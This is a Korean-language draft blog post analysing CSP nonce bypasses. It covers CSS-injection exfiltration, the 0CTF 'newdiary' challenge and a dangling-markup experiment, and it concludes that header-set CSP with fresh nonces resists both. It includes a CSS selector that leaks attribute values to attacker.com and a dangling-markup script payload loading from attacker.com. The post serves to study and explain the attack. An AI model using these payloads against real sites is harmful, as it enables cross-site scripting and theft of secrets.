+++
date = '2025-08-29T19:59:06+09:00'
draft = true
title = '[Note] CSP Nonce 우회 방법 분석'
+++

## 브라우저 보안 정책
브라우저의 보안 정책에는 다양한 종류가 존재한다. 그중 대표적인 것이 SOP, CORS, CSP이다.

우선 `SOP(Same-Origin Policy)`는 웹 보안의 가장 기본적인 원칙이다. 동일한 Origin(프로토콜, 도메인, 포트가 모두 동일)에서만 리소스 접근을 허용함으로써, 악의적인 사이트가 다른 사이트의 민감한 데이터를 훔쳐보는 것을 막는다. 하지만 실제 웹 서비스에서는 외부 스크립트, CDN, API 등 다른 Origin의 리소스를 불가피하게 사용해야 하는 경우가 많다.

이러한 현실적인 요구를 충족하기 위해 등장한 것이 `CORS(Cross-Origin Resource Sharing)`이다. 서버가 Access-Control-Allow-Origin 같은 헤더를 통해 허용 범위를 지정하면, 브라우저는 특정 조건하에서 교차 출처 리소스 요청을 허용한다. 덕분에 API 기반의 웹 서비스 확장성이 가능해졌지만, 동시에 잘못된 설정은 보안 취약점으로 이어질 수 있다.

이후 보다 정교하고 강력한 보안 제어 수단으로 발전한 것이 `CSP(Content Security Policy)`이다. CSP는 단순히 출처를 제한하는 수준을 넘어, 어떤 스크립트가 실행될 수 있는지, 어떤 리소스를 로드할 수 있는지 세밀하게 통제할 수 있는 정책이다. 특히 XSS와 같은 클라이언트 측 공격을 방어하는 핵심 기술이다.

이 외에도 다양한 보안 정책이 존재하지만, CSP와 브라우저 기본 동작을 이용한 XSS 우회 방식을 중심으로 살펴보며, 그 중에서도 Nonce 정책에 대해 분석해볼 것이다.

---

## CSP Nonce

CSP에는 `default-src`, `script-src` 등 여러 지시어가 존재한다. 각 지시어에는 `'self'`, `'nonce-<nonce>'`와 같은 소스 표현식이 설정되며, 이는 화이트리스트 방식으로 지정된 소스만 리소스 접근을 허용한다.  

그중 `nonce-<nonce>`는 `script-src`에서 자주 사용되며, 해당 nonce 값을 가진 `<script>` 태그만 실행되도록 제한할 수 있다. Nonce는 매 요청마다 갱신되는 랜덤 값이므로 공격자가 예측하거나 재사용하기 어렵다.  

---

## CSP Nonce 우회 방법

CSP의 `script-src`에 Nonce가 설정되어 있을 때 이를 우회해 XSS 스크립트를 삽입하는 다양한 CTF 문제가 존재한다.  
주로 활용되는 방식은 다음 세 가지다.

1. **소스리스트 우회**  
   하나의 지시어에 여러 소스 표현식이 동시에 정의되어 있으면, 그중 하나만 충족해도 스크립트 실행이 허용된다.  
   예를 들어 `'self'`와 `'nonce-<nonce>'`가 함께 지정된 경우, 공격자는 nonce를 알지 못해도 `'self'`를 이용해 스크립트를 실행할 수 있다.

2. **고정 Nonce 재사용**  
   Nonce가 매 요청마다 새로 생성되지 않고 고정된 값으로 발급된다면, 공격자는 한 번 확보한 nonce를 계속 재활용할 수 있다.  

3. **Meta 태그 기반 CSP**  
   CSP를 HTTP 응답 헤더가 아닌 `<meta http-equiv="Content-Security-Policy">` 태그로 설정한 경우, 캐싱 정책에 따라 특정 응답이 고정된 상태로 재사용될 수 있다.  
   이때 HTML 문서나 리소스가 캐시되면 공격자는 동일한 nonce 값을 반복적으로 얻어낼 수 있어 보안에 취약해진다.

## 의문 제기

보안 강화를 위해 표준 권고대로 **Response Header에서 CSP를 설정하고 매번 새로운 nonce를 발급**한다면, 공격자가 nonce 값을 알아내는 것은 정말 불가능할까? 

관련 정보를 찾아보던 중 [2023-0CTF-newdiary](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/0CTF/2023/web/newdiary) 하는 매번 갱신되는 Nonce 값을 유출하여 XSS를 성공시키는 CTF 문제를 발견했다. 이 문제의 풀이를 이해하려면 먼저 CSS Injection 기법을 이해할 필요가 있다.  

CSS에서는 **선택자(selector) 문법**을 제공한다.  
- 예: `[attr=value]` 문법은 특정 속성 값이 정확히 일치하는 태그를 선택한다.  
- `^=`, `*=` 연산자를 이용하면 **속성 값의 접두사, 부분 문자열** 여부를 확인할 수 있다.  

이를 이용하면 다음과 같은 공격이 가능하다:  

```css
input[name="secret"][value^="a"] {
  background: url(https://attacker.com/leak?q=a);
}
```

위 코드는 value 값이 "a"로 시작한다면 공격자의 서버로 요청을 보내 속성 값을 한 글자씩 유추할 수 있다. 즉, CSS Injection을 통해 HTML 속성 값 전체를 외부로 누출할 수 있는 것이다.

실제 0CTF-newdiary 문제 풀이에서는 CSS Injection으로 meta 태그에 들어 있는 nonce 속성 값을 유출했고, 이를 조합하여 최종 nonce를 알아낸 뒤 삽입하여 XSS를 성공시켰다.

---

## CSS Injection 시도
나는 같은 방법을 실제 환경에서 시도해 보았다. 그러나 아무리 시도해도 nonce 값을 얻어낼 수 없었다.

문제를 다시 살펴보니 차이가 있었다.

CTF 문제에서는 CSP가 meta 태그로 설정되어 있었기 때문에, meta 태그 속성에 nonce가 노출되었다. 그러나 실제 환경에서는 CSP가 Response Header로 설정되어 있었고, 이 경우 nonce는 `<script>` 태그에만 부여된다.

[MDN Docs](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Global_attributes/nonce#accessing_nonces_and_nonce_hiding)
에 따르면, 보안상의 이유로 nonce 속성은 DOM API나 CSS 선택자에서 접근할 경우 빈 문자열만 반환된다. 이를 “nonce hiding” 정책이라고 한다.

---

## Dangling Markup Injection 시도
CSS Injection이 막혀 있다면 Dangling Markup Injection은 어떨까?

Dangling Markup Injection은 `<tag attr="`처럼 닫히지 않은 속성을 삽입하여, 이후 HTML 문서의 내용을 모두 해당 속성 값에 포함시켜버리는 기법이다. 닫는 `"`나 `>`를 만나기 전까지 문서가 속성 값으로 흡수되기 때문에, 기존의 `script` 요소가 뒤에 위치한다면 태그에 포함시킬 수 있다.

실험 환경에서 실제로 `<script>` 태그와 그 안의 `nonce` 속성을 감싸는 데 성공했다. 이로 인해 nonce hiding 정책을 우회해 CSS Injection으로 감싼 `nonce` 값을 유출할 수 있는 조건을 만들 수 있었다.

여기서 새로운 의문이 생겼다.

>“그렇다면 이렇게 감싸서 흡수한 nonce 값을 실제로 내 스크립트에 붙여서 실행할 수는 없을까?”

### 추가 실험: 감싼 nonce 활용
기존 `<script src="/static/origin.js" nonce="">` 형식의 스크립트 앞에 `<script src="https://attacker.com/static/xss.js" foo="` 라는 페이로드를 삽입해
```html
<script src="https://attacker.com/static/xss.js" foo="<script src=" /static/origin.js" nonce="">
```
위와 같은 형태의 정상적인 nonce값을 가진 script를 생성할 수 있었다. [HTML Standard - 13.2.2 Parse errors](https://html.spec.whatwg.org/multipage/parsing.html#parse-errors)에 따르면, 문법 오류를 발견해도 파싱은 중단되지 않고 대체 처리 규칙이 적용된다.

따라서 이론적으로 삽입된 스크립트가 CSP에 의해 허용되어 실행될 것이라고 예상했다.

그러나 실제로는 스크립트가 실행되지 않았다.

### Is element nonceable?
이후 표준 문서를 찾아보니 [W3C Content Security Policy Level 3 - 6.7.3.1 Is element nonceable](https://www.w3.org/TR/CSP3/#is-element-nonceable)규정이 있었다.  
이 규칙은 비정상적인 구문이나 공격을 통해 삽입된 요소에는 기존 `nonce`가 적용되지 않도록 차단하는 정책으로, 댕글링 마크업을 이용한 `nonce` 재사용 공격을 원천적으로 막는다.

즉, 내가 삽입한 `<script>`는 `nonce` 속성이 있었음에도 불구하고 CSP에 의해 차단된 것이다.

---

## 결론
- **CSS Injection: Response Header** 기반 CSP의 nonce는 nonce hiding 정책으로 인해 유출 불가.

- **Dangling Markup Injection**: `<script>`에 `nonce` 속성을 감싸서 포함시키는 것은 가능했지만, Is element nonceable 규칙에 의해 실행 차단.

따라서 표준 권장대로 Response Header에 설정된 CSP와 매번 갱신되는 nonce가 사용되는 환경에서는 단순히 CSS Injection이나 Dangling Markup Injection만으로 nonce를 유출하거나 재사용할 수 없다.

그러나 만약 Dangling Markup Injection으로 `<script>`와 `nonce` 속성을 감싸는 것이 가능하고, 동시에 CSS Injection을 통해 해당 속성 값을 외부로 유출할 수 있다면, 이 두 기법을 조합하여 CTF 문제에서처럼 CSP Nonce 기반 XSS를 재현하는 것도 이론적으로는 가능하다.

>참고자료  
>[W3C Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)  
>[WHATWG HTML Standard: Parsing](https://html.spec.whatwg.org/multipage/parsing.html)  
>[HSPACE Tech Blog](https://blog.hspace.io/posts/CSS_injection/)  
>[Medium](https://0x0elliot.medium.com/babier-csp-a-great-beginner-xss-challenge-c8b431c03385)  
>[Tistory](https://gayunkim-1.tistory.com/38)  
>[Github](https://github.com/whatwg/html/issues/2369)  
>[Web-platform-tests dashboard](https://wpt.fyi/results/content-security-policy/nonce-hiding/script-nonces-hidden.html?label=master&label=experimental&aligned)